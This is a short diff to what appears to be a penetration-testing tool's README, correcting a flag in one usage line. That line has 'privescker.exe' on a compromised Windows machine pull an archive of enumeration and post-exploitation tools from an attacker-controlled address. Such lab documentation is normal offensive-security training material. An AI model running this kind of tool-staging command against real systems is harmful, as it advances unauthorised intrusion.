@@ -37,7 +37,7 @@ Now multiply that by all the scripts, enum and post exploitation tools you want 
 
 Once the privescker.exe binary is on the machine:
 ```
-privescker.exe -u http://10.10.14.12:8000/enum-tools.zip -p c:\users\public
+privescker.exe -u http://10.10.14.12:8000/enum-tools.zip -o c:\users\public
 ```
 
 Then all your files you need to move to Windows will be dumped to the location you chose.
